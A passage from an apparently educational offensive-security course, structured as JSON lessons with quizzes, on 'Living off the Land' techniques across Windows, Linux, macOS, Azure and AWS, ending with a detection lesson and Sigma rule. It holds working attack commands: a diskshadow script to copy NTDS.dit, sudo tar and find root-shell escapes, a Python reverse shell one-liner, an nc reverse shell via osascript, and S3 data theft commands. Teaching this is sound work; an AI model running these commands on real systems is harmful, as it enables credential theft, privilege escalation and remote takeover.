                        "content": "<p><strong>diskshadow.exe</strong> is the command-line utility for interacting with VSS. An attacker with administrator privileges on a Domain Controller can use `diskshadow` with a simple script to perform the following actions:</p><ol><li>Create a new, persistent shadow copy of the C: drive.</li><li>'Expose' this shadow copy by mounting it to a new drive letter (e.g., Z:).</li><li>Copy the `NTDS.dit` file from this new shadow copy drive (`Z:\\windows\\ntds\\ntds.dit`) to a staging directory.</li><li>Unmount and delete the shadow copy to clean up the evidence.</li></ol><p>This allows the attacker to get a copy of the password hash database, which they can then take offline to extract all domain credentials.</p>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a_a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Diskshadow script to copy NTDS.dit",
                    "language": "batch",
                    "code": "# Attacker would save the following commands into a script file, e.g., 'script.txt'\n\n# Set the context to be persistent so the shadow copy survives\nset context persistent nowriters\n\n# Add the volume to be shadow copied\nadd volume c: alias shadow_c\n\n# Create the shadow copy\ncreate\n\n# Expose the shadow copy, mounting it as the G: drive\nexpose %shadow_c% g:\n\n# --- End of script ---\n\n# Attacker then runs diskshadow with this script:\ndiskshadow.exe /s C:\\temp\\script.txt\n\n# Now the shadow copy is mounted. The attacker can copy ntds.dit:\ncopy G:\\windows\\ntds\\ntds.dit C:\\temp\\loot\\ntds.dit\n\n# After copying, the attacker unexposes and deletes the shadow copy to clean up."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the `NTDS.dit` file?",
                        "options": [
                            "A system log file.",
                            "The Active Directory database file that stores all the password hashes for the domain.",
                            "A configuration file for IIS.",
                            "A temporary file."
                        ],
                        "correct": 1,
                        "explanation": "The NTDS.dit file is the primary 'crown jewel' on a Domain Controller. Gaining access to it is equivalent to a full domain compromise."
                    },
                    {
                        "id": 2,
                        "question": "Why can't an attacker normally copy the `NTDS.dit` file directly?",
                        "options": [
                            "Because it is too large.",
                            "Because it is encrypted.",
                            "Because it is constantly in use and locked by the operating system.",
                            "Because they don't have the right permissions."
                        ],
                        "correct": 2,
                        "explanation": "The Active Directory service keeps a permanent lock on the file, preventing it from being copied or read by normal means. This is a protective measure."
                    },
                    {
                        "id": 3,
                        "question": "How does `diskshadow.exe` allow an attacker to bypass this file lock?",
                        "options": [
                            "It doesn't.",
                            "It crashes the Active Directory service.",
                            "It exploits a vulnerability in the file system.",
                            "It uses the Volume Shadow Copy Service (VSS) to create a point-in-time copy of the file, which is not locked."
                        ],
                        "correct": 3,
                        "explanation": "This is a classic example of abusing a legitimate backup/administrative feature for offensive purposes. The attacker is using VSS exactly as it was designed, but for a malicious goal."
                    }
                ]
            }
        },
        {
            "id": "lesson-23",
            "title": "Living off the Land in Linux (GTFOBins)",
            "duration": "75 min",
            "objectives": [
                "Understand the core principles of LotL on Linux systems",
                "Learn how to use GTFOBins to find abusable binaries",
                "Explore how to use common binaries like find, tar, and ssh for malicious purposes",
                "Practice using a GTFOBins technique for privilege escalation"
            ],
            "content": {
                "overview": "Living off the Land is not just a Windows phenomenon. Linux systems are also full of powerful, dual-use binaries that can be abused by an attacker. This lesson introduces the core concepts of Linux LotL, with a focus on the indispensable GTFOBins project as a guide for finding abusable binaries.",
                "sections": [
                    {
                        "title": "GTFOBins",
                        "content": "<p><strong>GTFOBins</strong> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It is the Linux equivalent of the LOLBAS project.</p><p>For each binary, GTFOBins documents how it can be used to perform a variety of functions, such as:<ul><li>Spawning a shell.</li><li>Uploading or downloading files.</li><li>Escalating privileges via SUID or sudo.</li><li>Executing code.</li></ul></p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Abusing SUID and Sudo",
                        "content": "<p>The primary use of GTFOBins is for privilege escalation. An attacker who has compromised a Linux host will first search for SUID binaries or check their `sudo -l` permissions. They will then consult GTFOBins for each of these binaries.</p><h3>Example: Abusing `find` with Sudo</h3><p>An attacker runs `sudo -l` and discovers they are allowed to run the `find` command as root. They go to the GTFOBins page for `find`. GTFOBins provides the following command: `sudo find . -exec /bin/sh \\; -quit`. The `-exec` parameter of `find` is designed to execute a command on the files it finds. The attacker uses this to execute `/bin/sh`, which, because it is being run by a `sudo find` command, will be a root shell.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Using GTFOBins to Find a Privilege Escalation Path",
                    "language": "bash",
                    "code": "# Attacker is on a compromised Linux host as a standard user.\n\n# 1. Attacker checks their sudo permissions.\nsudo -l\n# > User user may run the following commands on this host:\n# >     (root) /usr/bin/tar\n\n# 2. Attacker consults the GTFOBins page for 'tar'.\n#    They find the following command for sudo privilege escalation:\n\n# 3. Attacker executes the command from GTFOBins.\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n\n# This command abuses the '--checkpoint-action' feature of tar to execute '/bin/sh'.\n# Because it is run with sudo, the attacker now has a root shell.\n# whoami\n# > root"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is GTFOBins?",
                        "options": [
                            "A type of Linux malware.",
                            "A curated list of Unix/Linux binaries that can be abused to bypass security restrictions, often for privilege escalation.",
                            "A Linux security product.",
                            "A command to install software."
                        ],
                        "correct": 1,
                        "explanation": "GTFOBins is the essential reference for Linux LotL, providing a comprehensive list of binaries and the exact commands to abuse their functionality."
                    },
                    {
                        "id": 2,
                        "question": "What is the most common use case for GTFOBins in an engagement?",
                        "options": [
                            "To gain initial access.",
                            "To find a privilege escalation path by abusing a SUID binary or a sudo rule.",
                            "To exfiltrate data.",
                            "To write a report."
                        ],
                        "correct": 1,
                        "explanation": "GTFOBins is heavily focused on privilege escalation. It catalogs the many ways that standard system utilities can be abused to spawn a root shell if they are misconfigured with SUID bits or sudo permissions."
                    },
                    {
                        "id": 3,
                        "question": "An attacker who finds they can run `sudo less` would consult GTFOBins to find what?",
                        "options": [
                            "How to read a file.",
                            "The command to type inside of `less` (which is `!/bin/sh`) to escape to a root shell.",
                            "The version of the `less` command.",
                            "How to uninstall the `less` command."
                        ],
                        "correct": 1,
                        "explanation": "Many interactive programs like text editors (`vim`, `nano`) and pagers (`less`, `more`) have a feature to execute shell commands from within the program. If these are run with sudo, this provides an easy and direct path to a root shell."
                    }
                ]
            }
        },
        {
            "id": "lesson-24",
            "title": "Scripting with bash and python for LotL",
            "duration": "60 min",
            "objectives": [
                "Understand how common scripting languages can be used for LotL",
                "Explore how to use bash for reconnaissance and automation",
                "Learn how to spawn a reverse shell using only Python",
                "Analyze the benefits of using on-host scripting vs. bringing custom binaries"
            ],
            "content": {
                "overview": "Nearly all Linux systems come with powerful scripting languages installed by default, most notably `bash` and `python`. This lesson covers how an attacker can leverage these ubiquitous interpreters to perform a wide range of malicious actions without needing to upload a single custom binary.",
                "sections": [
                    {
                        "title": "Leveraging On-Host Scripting",
                        "content": "<p>Using the scripting languages that are already on the system is the ultimate 'Living off the Land' technique. It provides several key advantages:</p><ul><li><strong>Stealth:</strong> Running a Python script is far less suspicious than running an unknown ELF binary.</li><li><strong>Flexibility:</strong> The attacker is not limited to the functionality of a single binary; they can write a script to do almost anything.</li><li><strong>Evasion:</strong> It bypasses application whitelisting that is focused on blocking untrusted executables.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Spawning Reverse Shells",
                        "content": "<p>One of the most common goals for an attacker is to get an interactive shell. A <strong>reverse shell</strong> is one where the compromised machine connects *out* to the attacker's listening server. This is often necessary to get past firewalls.</p><p>Instead of uploading a compiled reverse shell program, an attacker can use a one-liner in a language like Python, Bash, or Perl to create the network connection and redirect the standard input, output, and error of a shell (like `/bin/sh`) over that connection. This achieves a fully interactive shell using only the system's built-in interpreters.</p>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Spawning a Reverse Shell Using Only Python",
                    "language": "python",
                    "code": "# This is a classic Python one-liner for a reverse shell.\n# An attacker would run this on the victim machine.\n\n# python -c '...' : Execute the following Python code string.\n\n# The code does the following:\n# 1. Imports the necessary libraries (socket, subprocess, os).\n# 2. Creates a new TCP socket.\n# 3. Connects to the attacker's IP and port.\n# 4. Duplicates the socket's file descriptor to be the standard input, output, and error for the process.\n# 5. Spawns a new '/bin/sh' shell, which is now tied to the network socket.\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "Why is using a pre-installed scripting language like Python considered a LotL technique?",
                        "options": [
                            "Because Python is a compiled language.",
                            "Because the attacker is using a legitimate tool that is already on the system to execute their code.",
                            "Because Python is not very powerful.",
                            "Because it only works on Windows."
                        ],
                        "correct": 1,
                        "explanation": "This is the definition of LotL. The attacker is using the trusted, pre-installed Python interpreter to run their malicious logic, which is much stealthier than bringing their own custom executable."
                    },
                    {
                        "id": 2,
                        "question": "What is a 'reverse shell'?",
                        "options": [
                            "A shell that is very slow.",
                            "A shell where the attacker connects to the victim machine.",
                            "A shell where the victim machine connects out to the attacker's listening server.",
                            "A read-only shell."
                        ],
                        "correct": 2,
                        "explanation": "Reverse shells are used to bypass firewalls. Since outbound connections are often less restricted than inbound ones, having the victim connect out is a much more reliable way to establish a C2 channel."
                    },
                    {
                        "id": 3,
                        "question": "The Python one-liner for a reverse shell works by redirecting what?",
                        "options": [
                            "The computer's display.",
                            "The standard input, output, and error of a shell process to a network socket.",
                            "The mouse and keyboard.",
                            "The file system."
                        ],
                        "correct": 1,
                        "explanation": "The key to an interactive shell is redirecting the standard I/O streams. The `os.dup2` calls in the one-liner are what accomplish this, effectively 'plugging' the `/bin/sh` process into the network connection."
                    }
                ]
            }
        },
        {
            "id": "lesson-25",
            "title": "Living off the Land in macOS",
            "duration": "60 min",
            "objectives": [
                "Understand the unique aspects of the macOS environment",
                "Learn how to abuse osascript (AppleScript) for execution",
                "Explore the use of launchctl for persistence on macOS",
                "Analyze the security implications of shell scripts and built-in Unix tools"
            ],
            "content": {
                "overview": "While Windows and Linux are common targets, macOS also has its own rich ecosystem of built-in tools and features that can be abused by an adversary. This lesson provides an introduction to LotL techniques specific to the macOS operating system.",
                "sections": [
                    {
                        "title": "Abusing osascript (AppleScript)",
                        "content": "<p><strong>AppleScript</strong> is a scripting language designed to control applications and the macOS GUI. The `osascript` command-line tool can be used to execute AppleScript code.</p><p>An attacker can use `osascript` to perform a wide range of malicious actions, from displaying fake password prompts to the user, to telling the Terminal application to open a new window and run a reverse shell. Because `osascript` is a core part of the OS, it is a powerful tool for evading simple security controls.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Persistence with launchd and launchctl",
                        "content": "<p>The modern process for managing daemons and agents on macOS is <strong>launchd</strong>. The `launchctl` command is used to interact with it. It is the macOS equivalent of `systemd` in Linux or the Task Scheduler in Windows.</p><p>An attacker can create a simple `.plist` (Property List) file that defines a 'Launch Agent'. This file can be configured to run the attacker's payload whenever the user logs in. By placing this file in the user's `~/Library/LaunchAgents` directory, the attacker can establish a simple and effective persistence mechanism.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Leveraging the Unix Foundation",
                        "content": "<p>Under the hood, macOS is a certified Unix operating system. This means that nearly all of the standard Unix/Linux LotL binaries and scripting techniques are also available on macOS.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Familiar Tools</strong></div><p>An attacker on a Mac can use `bash`, `python`, `perl`, `find`, `ssh`, and many other tools covered in the Linux lessons to perform reconnaissance, privilege escalation, and exfiltration. This shared Unix heritage makes the transition from Linux to macOS exploitation relatively straightforward for an adversary.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a_a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "osascript -e 'tell app \"Terminal\" to do script \"nc -e /bin/bash <ip> <port>\"'",
                    "language": "applescript",
                    "code": "# This command uses osascript to execute AppleScript code from the command line.\n\n# -e '...' : Execute the following script string.\n\n# The script does the following:\n# 'tell app \"Terminal\"' : Target the Terminal application.\n# 'to do script \"...\"' : Tell it to run a command in a new window.\n# 'nc -e /bin/bash ...' : The command is a classic netcat reverse shell.\n\n# This is a simple way to get a new shell by abusing the user's GUI applications."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is `osascript`?",
                        "options": [
                            "A type of malware.",
                            "A command-line tool on macOS for executing AppleScript.",
                            "A text editor.",
                            "A network scanner."
                        ],
                        "correct": 1,
                        "explanation": "`osascript` is the legitimate, built-in tool for running AppleScript. Attackers abuse it to control other applications and execute code."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary mechanism for establishing persistence on a modern macOS system?",
                        "options": [
                            "Registry Run Keys",
                            "Cron jobs",
                            "Creating a Launch Agent or Launch Daemon and managing it with `launchctl`.",
                            "Modifying the user's login script."
                        ],
                        "correct": 2,
                        "explanation": "`launchd` is the modern and standard service management framework for macOS. Creating a Launch Agent is the equivalent of creating a Scheduled Task on Windows or a systemd service on Linux."
                    },
                    {
                        "id": 3,
                        "question": "Many Linux LotL techniques are also effective on macOS. Why is this?",
                        "options": [
                            "Because macOS is a version of Windows.",
                            "Because macOS is based on Unix and shares a large number of common command-line utilities and scripting languages.",
                            "It is just a coincidence.",
                            "Because they are both developed by Apple."
                        ],
                        "correct": 1,
                        "explanation": "The shared Unix foundation means that a huge number of standard tools (`bash`, `python`, `ssh`, etc.) and concepts are directly applicable, making macOS a familiar environment for an attacker experienced with Linux."
                    }
                ]
            }
        },
        {
            "id": "lesson-26",
            "title": "Living off the Cloud: Abusing Azure CLI",
            "duration": "75 min",
            "objectives": [
                "Understand how pre-installed cloud management tools can be abused",
                "Learn how to use the Azure CLI (`az`) for reconnaissance",
                "Explore how to enumerate virtual machines, storage, and user roles",
                "Analyze the risk of a compromised DevOps workstation with cloud credentials"
            ],
            "content": {
                "overview": "The 'land' is no longer just on-premise; it's also in the cloud. Attackers who compromise a developer or administrator's workstation may find pre-configured cloud command-line tools. This lesson covers how an attacker can 'Live off the Cloud' by abusing the Azure CLI to enumerate and pivot within a target's cloud environment.",
                "sections": [
                    {
                        "title": "The Compromised DevOps Workstation",
                        "content": "<p>A common scenario is the compromise of a DevOps engineer's machine. These machines are often a goldmine for an attacker because they contain the tools and, more importantly, the credentials needed to manage the organization's cloud infrastructure.</p><p>If an attacker gains access to a machine that has the <strong>Azure CLI (`az`)</strong> installed and has a logged-in session, they can inherit that session and use the CLI to perform reconnaissance on the entire Azure subscription.</p>",
                        "image": "https://i.imgur.com/fgS4fG3.png"
                    },
                    {
                        "title": "Enumerating Azure with the `az` CLI",
                        "content": "<p>Using the legitimate `az` tool, an attacker can map out the entire cloud environment. The commands are simple and well-documented.</p><h3>Key Reconnaissance Commands:</h3><ul><li><code>az account show</code>: See information about the current subscription.</li><li><code>az vm list</code>: List all virtual machines in the subscription.</li><li><code>az storage account list</code>: List all storage accounts.</li><li><code>az role assignment list --all</code>: Enumerate all the IAM roles and permissions.</li></ul><p>This information allows an attacker to find their high-value targets in the cloud, such as production servers or storage accounts containing sensitive data.</p>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a_a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "az vm list-ip-addresses",
                    "language": "bash",
                    "code": "# An attacker has compromised a machine with a logged-in Azure CLI session.\n\n# 1. First, check the current context.\naz account show\naz ad signed-in-user show\n\n# 2. Enumerate all the resource groups in the subscription.\naz group list -o table\n\n# 3. List all the virtual machines.\naz vm list -o table\n\n# 4. Get the public and private IP addresses for all the VMs.\naz vm list-ip-addresses -o table\n\n# 5. List all the storage accounts.\naz storage account list -o table\n\n# 6. List all the files in a specific file share.\naz storage file list --share-name myshare --account-name mystorageaccount -o table"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the 'Living off the Cloud' concept?",
                        "options": [
                            "An attack that targets the cloud provider's infrastructure.",
                            "The abuse of legitimate, pre-installed cloud management tools (like the Azure CLI) to perform reconnaissance and lateral movement within a cloud environment.",
                            "A type of cloud storage.",
                            "A cloud security product."
                        ],
                        "correct": 1,
                        "explanation": "This is a direct extension of the LotL philosophy to cloud environments. The attacker uses the target's own management tools against them, which is stealthier than making raw API calls."
                    },
                    {
                        "id": 2,
                        "question": "Why is a DevOps engineer's workstation a high-value target for an attacker?",
                        "options": [
                            "Because they have fast computers.",
                            "Because they often have pre-configured command-line tools and cached credentials for the organization's cloud environment.",
                            "Because they are easy to find.",
                            "Because they do not have security software."
                        ],
                        "correct": 1,
                        "explanation": "Compromising a DevOps machine can be a 'keys to the kingdom' scenario for the cloud. The attacker doesn't need to steal credentials if they can simply inherit an already-authenticated session."
                    },
                    {
                        "id": 3,
                        "question": "Which `az` command would an attacker use to find the IP addresses of all the virtual machines in a subscription?",
                        "options": [
                            "az vm list",
                            "az account show",
                            "az vm list-ip-addresses",
                            "az storage account list"
                        ],
                        "correct": 2,
                        "explanation": "This command provides a quick and comprehensive list of all the potential server targets in the environment, making it a critical step in cloud reconnaissance."
                    }
                ]
            }
        },
        {
            "id": "lesson-27",
            "title": "Living off the Cloud: Abusing AWS CLI",
            "duration": "75 min",
            "objectives": [
                "Understand how the AWS CLI can be abused by an attacker",
                "Learn how to enumerate S3 buckets, IAM roles, and EC2 instances",
                "Explore how to use stolen credentials with the AWS CLI",
                "Analyze the risk of overly permissive IAM roles from an attacker's perspective"
            ],
            "content": {
                "overview": "Similar to Azure, Amazon Web Services (AWS) has its own powerful command-line interface, the AWS CLI. This lesson covers how an attacker who has compromised a set of AWS credentials can use this legitimate tool to enumerate and exploit misconfigurations in an AWS environment.",
                "sections": [
                    {
                        "title": "Abusing the AWS CLI",
                        "content": "<p>If an attacker compromises a developer's workstation or a misconfigured EC2 instance, they may be able to steal a set of AWS access keys (an Access Key ID and a Secret Access Key). They can then configure their own AWS CLI with these keys.</p><p>From this point on, the attacker can perform any action that the compromised key's IAM policy allows. The `aws` command-line tool becomes their primary interface for interacting with the target's cloud environment.</p>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    },
                    {
                        "title": "Enumerating AWS",
                        "content": "<p>The first step for an attacker is always enumeration. They will use the compromised keys to map out the environment.</p><h3>Key Reconnaissance Commands:</h3><ul><li><code>aws sts get-caller-identity</code>: 'Who am I?' Find out what user or role the keys belong to.</li><li><code>aws iam list-users</code>: List all IAM users.</li><li><code>aws ec2 describe-instances</code>: Get detailed information about all EC2 virtual machines.</li><li><code>aws s3 ls</code>: List all S3 storage buckets.</li><li><code>aws iam list-attached-user-policies --user-name <user></code>: Enumerate the permissions for a specific user to find privilege escalation paths.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a_a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "aws s3 ls --recursive",
                    "language": "bash",
                    "code": "# An attacker has stolen a set of AWS keys and configured their local CLI.\n\n# 1. Check the identity associated with the keys.\naws sts get-caller-identity\n\n# 2. List all S3 buckets in the account.\naws s3 ls\n# > 2023-01-10 10:00:00 my-corp-logs\n# > 2023-02-15 12:30:00 my-corp-backups\n# > 2023-03-20 14:00:00 my-corp-sensitive-data  <-- Interesting!\n\n# 3. Recursively list all files in the interesting bucket.\naws s3 ls s3://my-corp-sensitive-data --recursive\n\n# 4. Copy a specific sensitive file from the bucket to the attacker's machine.\naws s3 cp s3://my-corp-sensitive-data/customer_records.csv ."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the most critical prerequisite for an attacker to abuse the AWS CLI against a target environment?",
                        "options": [
                            "To have a fast internet connection.",
                            "To have a valid set of AWS access keys (Access Key ID and Secret Access Key) for the target account.",
                            "To have the AWS CLI installed on the target's machine.",
                            "To know the target's account number."
                        ],
                        "correct": 1,
                        "explanation": "The AWS CLI is just a client. To do anything, it must be authenticated. The attacker's primary goal is to steal a set of keys, which they can then use with their own local installation of the tool."
                    },
                    {
                        "id": 2,
                        "question": "Which command would an attacker use to find out what permissions their stolen keys have?",
                        "options": [
                            "aws s3 ls",
                            "aws ec2 describe-instances",
                            "aws sts get-caller-identity and aws iam list-attached-user-policies",
                            "aws configure"
                        ],
                        "correct": 2,
                        "explanation": "`get-caller-identity` tells the attacker *who* they are, and the `iam` commands can then be used to determine what that identity is *allowed to do*. This is a crucial first step in planning a cloud-based attack."
                    },
                    {
                        "id": 3,
                        "question": "An attacker successfully running `aws s3 ls` and seeing a list of all buckets indicates what?",
                        "options": [
                            "A vulnerability in the S3 service itself.",
                            "An IAM misconfiguration where the compromised credentials have overly permissive access to S3.",
                            "That the S3 buckets are all public.",
                            "That the attacker has a fast connection."
                        ],
                        "correct": 1,
                        "explanation": "This is a classic example of an IAM misconfiguration. The principle of least privilege dictates that a user or role should only have access to the specific resources it needs. The ability to list *all* buckets is a sign of an overly permissive policy."
                    }
                ]
            }
        },
        {
            "id": "lesson-28",
            "title": "Combining Techniques: The LotL Kill Chain",
            "duration": "75 min",
            "objectives": [
                "Understand how to chain multiple LotL techniques together",
                "Design a full attack path using only native system tools",
                "Analyze a sample LotL kill chain from initial access to exfiltration",
                "Appreciate the stealth and effectiveness of a pure LotL approach"
            ],
            "content": {
                "overview": "Individual LotL techniques are powerful, but their true strength lies in combining them into a full attack chain. This lesson demonstrates how an attacker can go from initial access to objective completion using nothing but the built-in tools of the operating system, creating a highly evasive and difficult-to-detect attack.",
                "sections": [
                    {
                        "title": "The LotL Kill Chain",
                        "content": "<p>A sophisticated adversary will chain together a series of LotL techniques to achieve their goal. This allows them to operate entirely without custom malware, which is a massive advantage for evading endpoint security.</p>",
                        "image": "https://i.imgur.com/8a6R2aU.png"
                    },
                    {
                        "title": "A Sample Attack Chain",
                        "content": "<p>Let's trace a plausible, end-to-end attack using only the LotL techniques we have learned:</p><ol><li><strong>Initial Access:</strong> Attacker sends a phishing email with a malicious HTA file. The victim opens it, and <strong>`mshta.exe`</strong> executes a PowerShell download cradle.</li><li><strong>Execution & C2:</strong> The PowerShell cradle downloads and executes a C2 implant entirely in memory. The C2 traffic is tunneled over <strong>DNS</strong> to bypass the firewall.</li><li><strong>Discovery:</strong> The attacker uses <strong>`whoami`</strong>, <strong>`net.exe`</strong>, and <strong>`dsquery.exe`</strong> to perform situational awareness and enumerate the AD domain.</li><li><strong>Privilege Escalation:</strong> The attacker uses <strong>`LinPEAS`</strong> or <strong>`winPEAS`</strong> to find a sudo misconfiguration or a vulnerable service and gains root/SYSTEM privileges on the initial host.</li><li><strong>Credential Access:</strong> The attacker uses <strong>`rundll32.exe`</strong> and <strong>`comsvcs.dll`</strong> to dump LSASS memory.</li><li><strong>Lateral Movement:</strong> The attacker uses the stolen hashes with <strong>`wmic.exe`</strong> or <strong>`schtasks.exe`</strong> to move to the Domain Controller.</li><li><strong>Objective:</strong> On the DC, the attacker uses <strong>`diskshadow.exe`</strong> to copy the `NTDS.dit` file and exfiltrates it over their DNS tunnel.</li></ol><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>No Custom Malware</strong></div><p>In this entire, devastating attack chain, the attacker never dropped a single custom `.exe` file to disk. Every action was performed by a legitimate, signed OS binary, making detection incredibly challenging for defenders.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a_a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Chained LotL Script (Conceptual)",
                    "language": "powershell",
                    "code": "# This conceptual script chains several LotL techniques together.\n\n# 1. Discovery: Find the Domain Controller\n$DC = (Get-ADDomainController).HostName\n\n# 2. Lateral Movement: Copy a script to the DC\nCopy-Item .\\Get-Ntds.ps1 -Destination \"\\\\$DC\\C$\\Temp\\\"\n\n# 3. Remote Execution: Use WinRM to run the script on the DC\nInvoke-Command -ComputerName $DC -ScriptBlock {\n    # 4. Collection: The script uses diskshadow to get NTDS.dit\n    C:\\Temp\\Get-Ntds.ps1\n}\n\n# 5. Exfiltration: Download the stolen file from the DC's admin share\nCopy-Item \"\\\\$DC\\C$\\Temp\\ntds.dit\" .\\loot\\"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is meant by a 'LotL Kill Chain'?",
                        "options": [
                            "A type of malware.",
                            "A single LotL technique.",
                            "A full, end-to-end attack that is conducted by chaining together multiple different LotL techniques.",
                            "A defensive strategy."
                        ],
                        "correct": 2,
                        "explanation": "The 'kill chain' concept refers to the full sequence of an attack. A LotL kill chain is one where every stage of the attack is performed by abusing built-in system tools."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary advantage for an attacker of using a pure LotL attack chain?",
                        "options": [
                            "It is very fast.",
                            "It is very easy to do.",
                            "It is extremely stealthy and can bypass defenses like application whitelisting and signature-based AV entirely.",
                            "It does not require credentials."
                        ],
                        "correct": 2,
                        "explanation": "The stealth provided by a pure LotL approach is its greatest strength. By never dropping a custom, untrusted binary, the attacker avoids many of the tripwires that a traditional security product is looking for."
                    },
                    {
                        "id": 3,
                        "question": "In the example attack chain, which tool was used for credential access?",
                        "options": [
                            "mshta.exe",
                            "wmic.exe",
                            "diskshadow.exe",
                            "rundll32.exe with comsvcs.dll"
                        ],
                        "correct": 3,
                        "explanation": "`rundll32.exe` was used to call the `MiniDump` function from `comsvcs.dll`, which is the LotL technique for dumping the LSASS process memory to steal credentials."
                    }
                ]
            }
        },
        {
            "id": "lesson-29",
            "title": "Defensive Perspective: Detecting LotL",
            "duration": "75 min",
            "objectives": [
                "Understand the fundamental challenge of detecting LotL attacks",
                "Learn the importance of comprehensive command-line and script block logging",
                "Explore how behavioral analytics and EDRs can spot malicious use of legitimate tools",
                "Analyze a log file to find the traces of a LotL attack"
            ],
            "content": {
                "overview": "Detecting Living off the Land attacks is one of the biggest challenges for a modern Blue Team. You can't simply block or alert on `powershell.exe`, because administrators need it to do their jobs. This lesson shifts our perspective to the defender, exploring the logging and analytics techniques required to spot a legitimate tool being used for a malicious purpose.",
                "sections": [
                    {
                        "title": "The Detection Challenge",
                        "content": "<p>The core challenge is separating the signal from the noise. How do you distinguish between an administrator using PowerShell to remotely manage a server, and an attacker using PowerShell to move laterally?</p><p>The answer is that you cannot rely on the *tool* itself as an indicator of evil. You must look at the *context* and the *behavior*. Detection must be based on the command-line arguments, the parent-child process relationships, and the sequence of actions, not just the name of the process.</p>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    },
                    {
                        "title": "Comprehensive Logging",
                        "content": "<p>You cannot detect what you do not log. The foundation of LotL detection is to turn on comprehensive logging on your endpoints.</p><h3>Key Log Sources:</h3><ul><li><strong>Command-Line Logging (Event ID 4688):</strong> Windows can be configured to log every single command-line argument for every process that is created. This is essential for seeing what `powershell.exe` or `wmic.exe` is actually doing.</li><li><strong>PowerShell Script Block Logging:</strong> This logs the actual content of the PowerShell scripts being executed, even if they are run in-memory or are heavily obfuscated.</li><li><strong>Sysmon:</strong> A powerful, free tool from Microsoft that provides deep, EDR-like telemetry about process creation, network connections, file modifications, and more.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Behavioral Analytics",
                        "content": "<p>Once the data is being collected, a Security Information and Event Management (SIEM) or an EDR platform can use it to build behavioral detection rules.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Detecting the TTP</strong></div><p>Instead of a rule that says 'alert on malware.exe', a behavioral rule would say:<ul><li>'Alert when Microsoft Word (`winword.exe`) spawns a PowerShell process.' (Detecting phishing with a malicious macro).</li><li>'Alert when `lsass.exe` is accessed by any process other than a known system process.' (Detecting credential dumping).</li><li>'Alert when `regsvr32.exe` makes an outbound network connection.' (Detecting a remote scriptlet attack).</li></ul>This focus on the behavior (the TTP) is the key to detecting LotL attacks.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a_a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Writing_a_Sigma_Rule_for_LOLBin_Execution.yml",
                    "language": "yaml",
                    "code": "# Sigma is a generic, open-source format for SIEM detection rules.\n# This rule detects the use of certutil.exe to download a file.\n\ntitle: Certutil Download\nstatus: stable\ndescription: Detects the use of certutil.exe to download a file from a URL.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Red Team\ndate: 2023/04/01\n\nlogsource:\n    product: windows\n    category: process_creation\n\ndetection:\n    selection:\n        Image|endswith: '\\certutil.exe'\n        CommandLine|contains: '-urlcache'\n    condition: selection\n\nfalsepositives:\n    - Legitimate administrative activity (rare).\nlevel: high"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the fundamental challenge of detecting Living off the Land attacks?",
                        "options": [
                            "Attackers use custom, unknown tools.",
                            "The attacks are too fast.",
                            "Distinguishing between a legitimate administrative use of a tool and a malicious use.",
                            "The attacks do not generate any logs."
                        ],
